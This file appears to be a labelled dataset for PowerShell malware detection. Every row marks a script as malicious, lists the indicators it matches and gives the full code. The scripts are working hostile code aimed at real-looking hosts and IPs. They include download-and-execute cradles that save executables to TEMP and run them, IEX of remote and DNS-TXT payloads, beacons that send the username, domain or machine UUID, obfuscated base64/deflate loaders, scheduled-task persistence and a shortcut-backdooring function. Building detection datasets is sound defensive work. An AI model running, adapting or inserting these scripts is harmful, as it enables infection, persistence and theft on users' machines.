filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content
1399.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,140,140,False,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.amspeconline.com/123/nana.exe', $dpl);Start-Process $dpl"
1693.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/xsakpo.exe',""$env:TEMP\euioko.exe"");Start-Process (""$env:TEMP\euioko.exe"")"
179.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/i1/iz_001.exe',""$env:TEMP\iz_001.exe"");Start-Process (""$env:TEMP\iz_001.exe"")"
2294.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/hsmqrh.exe',""$env:TEMP\winreg.exe"");Start-Process (""$env:TEMP\winreg.exe"")"
2713.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/b1/bo_001.exe',""$env:TEMP\bo_001.exe"");Start-Process (""$env:TEMP\bo_001.exe"")"
2920.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
3426.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,143,143,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',""$env:TEMP\Dropbox.exe"");Start-Process (""$env:TEMP\Dropbox.exe"")"
1946.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,144,144,False,"(New-Object System.Net.WebClient).DownloadFile('http://www.telemedia.co.za/wp-content/ozone/slim.exe','fleeble.exe');Start-Process 'fleeble.exe'"
3545.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,146,146,False,"(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/spe/spendy.exe',""$env:TEMP\spendy.exe"");Start-Process (""$env:TEMP\spendy.exe"")"
2227.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,147,147,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.28/update.exe',""$env:TEMP\file2x86.exe"");Start-Process (""$env:TEMP\file2x86.exe"")"
1515.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.45.193.17/update.exe',""$env:TEMP\updatex86.exe"");Start-Process (""$env:TEMP\updatex86.exe"")"
1839.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")"
1931.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")"
3671.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")"
1011.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,151,151,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.117.75.43/update.exe',""$env:TEMP\update1x86.exe"");Start-Process (""$env:TEMP\update1x86.exe"")"
2833.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,151,151,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.117.75.43/update.exe',""$env:TEMP\update1x86.exe"");Start-Process (""$env:TEMP\update1x86.exe"")"
3414.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,151,151,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.117.75.43/update.exe',""$env:TEMP\update1x86.exe"");Start-Process (""$env:TEMP\update1x86.exe"")"
1611.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,152,152,False,"(New-Object System.Net.WebClient).DownloadFile('http://www.fluidsystems.ml/P1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")"
4030.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,152,152,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.106.122.64/update.exe',""$env:TEMP\msupdate86.exe"");Start-Process (""$env:TEMP\msupdate86.exe"")"
450.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,75,75,False,iex (new-object net.webclient).downloadstring('https://invesco.online/aaa')
3062.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,78,78,False,IEX ((New-Object Net.WebClient).DownloadString('http://93.171.205.35:8080/'));
338.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,78,78,False,IEX (New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt')
3100.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,81,81,False,IEX ((new-object net.webclient).downloadstring('http://pmlabs.net/cis/test.jpg'))
3438.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,81,81,False,"iex (New-Object Net.WebClient).DownloadString(""http://52.183.79.94:80/TYBMkTfsQ"")"
2894.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,87,87,False,iex ((New-Object Net.WebClient).DownloadString('http://76.74.127.38/default-nco.html'))
2190.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,94,94,False,"iex (New-Object Net.WebClient).DownloadString(""http://84.200.84.187/Google Update Check.html"")"
3804.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,94,94,False,"iex (New-Object Net.WebClient).DownloadString(""http://84.200.84.187/Google Update Check.html"")"
3278.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,127,127,False,IEX ((new-object net.webclient).downloadstring('https://wowyy.ga/counter.php?c=pdfxpl '+($env:username)+'@'+($env:userdomain)))
3084.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,150,150,False,Set-ExecutionPolicy Bypass -Scope Process;IEX ((New-Object Net.WebClient).DownloadString('http://127.0.0.1/detxt.ps1') );detxt http://127.0.0.1/1.txt;
3537.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,6,True,282,282,False,$i = 0; $k = '1234'; IEX((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/is.txt'));Test-Querty -Querty ([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/pl.txt')) | %{ $_ -bXor $k[$i++ % $k.length] }) -Force
3780.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,2,True,499,499,False,"sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
2139.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,4,True,857,857,False,"$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider; $vc=$env:computername; $vu=$env:username; $vh=[system.convert]::tobase64string($sha1.ComputeHash([system.text.encoding]::utf8.getbytes($vc+$vu+$(gwmi win32_bios)))); $vs=[system.convert]::tobase64string([system.text.encoding]::utf8.getbytes($vc+'|'+$vu+'|'+'903f2f8cf535578b8c63dfcf5f1d3f549e489101')); $u='http://vanity-fair.org/news/rss.php?q='+$vs; $ps=(New-Object Net.WebClient).DownloadString($u); $ps=[Convert]::FromBase64String($ps); $n=$ps[0]; $k=$ps[1..$n]; $d=$ps[($n+1)..$ps.count]; for ($i=0; $i -lt $d.count -and $i -lt 1024; $i++){ $d[$i] = $d[$i] -bxor $k[$i % $n]; }; iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$d)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()"
2792.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
while($true){
	try{
		$wc.headers.add('user-agent',$u);
		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
	}
	catch{
		sleep 180;
	}
}"
3988.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
while($true){
	try{
		$wc.headers.add('user-agent',$u);
		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
	}
	catch{
		sleep 180;
	}
}"
1298.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""

if(-not(Test-Path -Path($path)))
{mkdir $path}

$fileout=""$path\L69742.vbs"";

$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";

$bytevbs=[System.Convert]::FromBase64String($encstrvbs);

$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);

$strvbs = $strvbs.replace('

set-content $fileout $strvbs;

$tmpfile=""$env:TEMP\U1848931.TMP"";



$pscode_b64  =get-content $tmpfile | out-string;

$pscode_b64=$pscode_b64.trim();


$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))

$id = [string](get-random -min 10000 -max 100000)

$pscode = $pscode.replace('

set-content ""$path\mc.ps1"" $pscode


$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";



iex 'cmd /c $taskstr';"
2546.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""

if(-not(Test-Path -Path($path)))
{mkdir $path}

$fileout=""$path\L69742.vbs"";

$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";

$bytevbs=[System.Convert]::FromBase64String($encstrvbs);

$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);

$strvbs = $strvbs.replace('

set-content $fileout $strvbs;

$tmpfile=""$env:TEMP\U1848931.TMP"";



$pscode_b64  =get-content $tmpfile | out-string;

$pscode_b64=$pscode_b64.trim();


$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))

$id = [string](get-random -min 10000 -max 100000)

$pscode = $pscode.replace('

set-content ""$path\mc.ps1"" $pscode


$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";



iex 'cmd /c $taskstr';"
905.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""

if(-not(Test-Path -Path($path)))
{mkdir $path}

$fileout=""$path\L69742.vbs"";

$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";

$bytevbs=[System.Convert]::FromBase64String($encstrvbs);

$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);

$strvbs = $strvbs.replace('

set-content $fileout $strvbs;

$tmpfile=""$env:TEMP\U1848931.TMP"";



$pscode_b64  =get-content $tmpfile | out-string;

$pscode_b64=$pscode_b64.trim();


$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))

$id = [string](get-random -min 10000 -max 100000)

$pscode = $pscode.replace('

set-content ""$path\mc.ps1"" $pscode


$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";



iex 'cmd /c $taskstr';"
git_53.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,2,True,1966,1966,False,"function Invoke-BackdoorLNK {


    [CmdletBinding()] Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $LNKPath,

        [String]
        $EncScript,

        [String]
        $RegPath = 'HKCU:\Software\Microsoft\Windows\debug',

        [Switch]
        $Cleanup
    )

    $RegParts = $RegPath.split(""\"")
    $Path = $RegParts[0..($RegParts.Count-2)] -join ""\""
    $Name = $RegParts[-1]


    $Obj = New-Object -ComObject WScript.Shell
    $LNK = $Obj.CreateShortcut($LNKPath)

    
    $TargetPath = $LNK.TargetPath
    $WorkingDirectory = $LNK.WorkingDirectory
    $IconLocation = $LNK.IconLocation

    if($CleanUp) {

        
        $OriginalPath = ($IconLocation -split "","")[0]

        $LNK.TargetPath = $OriginalPath
        $LNK.Arguments = $Null
        $LNK.WindowStyle = 1
        $LNK.Save()

        
        $null = Remove-ItemProperty -Force -Path $Path -Name $Name
    }
    else {

        if(!$EncScript -or $EncScript -eq '') {
            throw ""-EncScript or -Cleanup required!""
        }

        
        $null = Set-ItemProperty -Force -Path $Path -Name $Name -Value $EncScript

        ""[*] B64 script stored at '$RegPath'`n""

        
        $LNK.TargetPath = ""$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe""

        
        $LaunchString = '[System.Diagnostics.Process]::Start(""'+$TargetPath+'"");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp '+$Path+' '+$Name+').'+$Name+')))'

        $LaunchBytes  = [System.Text.Encoding]::UNICODE.GetBytes($LaunchString)
        $LaunchB64 = [System.Convert]::ToBase64String($LaunchBytes)

        $LNK.Arguments = ""-w hidden -nop -enc $LaunchB64""

        
        $LNK.WorkingDirectory = $WorkingDirectory
        $LNK.IconLocation = ""$TargetPath,0""
        $LNK.WindowStyle = 7
        $LNK.Save()

        ""[*] .LNK at $LNKPath set to trigger`n""
    }
}"
784.ps1,malicious,natural_overlap,IEX,IEX,1,True,73,73,False,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){iex $matches[1]}"
321.ps1,malicious,natural_overlap,IEX,IEX,1,True,76,76,False,"if(""""+(nslookup -q=txt l.ns.topbrains.pl.) -match ""@(.*)@""){iex $matches[1]}"
2115.ps1,malicious,natural_overlap,IEX,IEX,1,True,78,78,False,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){iex $matches[1]}
2752.ps1,malicious,natural_overlap,IEX,IEX,1,True,82,82,False,if(''+(nslookup -q=txt p.s.w2.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]}
3335.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|DownloadString|Net.WebClient,3,True,299,299,False,"$x=$Env:username;$u=""http://54.213.195.138/s2.txt?u="" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;"
3387.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|DownloadString|Net.WebClient,3,True,299,299,False,"$x=$Env:username;$u=""http://54.213.195.138/s2.txt?u="" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;"
3955.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|DownloadString|Net.WebClient,3,True,299,299,False,"$x=$Env:username;$u=""http://54.213.195.138/s2.txt?u="" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;"
722.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|DownloadString|Net.WebClient,3,True,304,304,False,"$x=$Env:username;$u=""http://www.bcbsarizona.org/s2.txt?u="" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;"
2019.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|FromBase64String,2,True,1173,1173,False,"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
2789.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|FromBase64String,2,True,1625,1625,False,"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9hzuHOoBpku011FymVUuo7WUpTK0TKB8u6EBgHLngXLYtflPa/3+yCDdiO4zsVJQaWmWefGZ6ZYZqzQMacwZDN+TPaI75A4UWYJHdBCqcnL/QPdIzdWZig/ByzMGZP5hec+nkiR77wZyjJA+UNXV22BM5RZNiyJqAfmqcnBYAG2dibI57Fet9L6Hbgq89CX3KxoltDihw7cAj6vyJO/STbC/lI4TTxPCkovtqKMRxdhaHALOu8HUrvp4dyLOJuJEMm62GMuJCvRnAcQW8RyyCqg94WZsfj7kn4DqjS2BrQWl8Uv5KSUFy9VA5nLmcMAwmPfvAM8RRkhFAGAJmGhziDPMPQqbzIzlzzt6rlGq4mEyQxMkmZv8GF/e3xH7WPt8okzpwblI7Hg2eUmXPnjlxtadb0onNew/5RT9OZChMk12xTwedxiCGk5KGo6YeHuSuTA8STmEgyFER9vI9wkF6XFhPN8xV3J5O+kKZVvYPd1FTGV0GAqSTsMhn14KEevZFJgf5MORcwzl8oPb1Wdxo/riSOJxNDnTNV2Y7z8fz8/fn3X1+6zXR6SBnTCghyIRQxSppgpDqg+oGAz9JcFgt1GuS1xjbHEpfSQRZw1eMmFxdXnjscWoraZ2Vjtu4p53yRQdUlQeSMkTX4+i0JaME7MJDNLzbbv6M1quXNgzoV9fCBuTxdifgpkmC6FvS7vXP4GgeCZ3wqweWCVOGrfuDAldpRWWakcNpgTrp4YA+sZe3k1rkXsUSzCrHT7VQ3zjWyJxlZzRxGfEHZgpgRPZ/mwhzroZJKZ6n839lrjzxoU8AmrdjXPNAhWc7IlxGttj+1f0YMiyhO0DSNWEmrBLlFPzQLCXXUbDAa3hbYDKF7oJQGKiYM7yi+ZiOw71Ypqsa2bgnKxNFxD8o8bEFRI/cVsxpkqXw1VY11jGDEVtOTOl9zYYukfn+DJQakLN1SSGUzJXxSnrqlKn6i8t91KtKp6obeYfkRMFimqoGpCWS7JU5Bvf/ptx58h2+5tAvOsMXzR/OWXnIQvUlcv2X73he6kloep6ERqcuFquOF4OoyJpmgDlDx4tNXImzBa/gDIbgA4++DhDfp6INW0Do5JNA35AvtLaSlyqiBatdxd9LI2lbSCiMnSNAX5vazitBl/YaaybIufHWc3aLMBSsHYEYfaNk+MBLZUQVb7bbDaW911ouzqs19jn8meRapodIYjhurciS4Cc+wng8999bD5ojZ53iSp6a1s0l5qomzhnCEGH8BN8LqW0P3YaHmNAUXRP5jUsycFc/BF0hzQbkXRUmjiRqHGvMNpe5TKLGkv73f5Xb54QL25msDen/0nd7H350PdHrfB1sNdfhAx+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
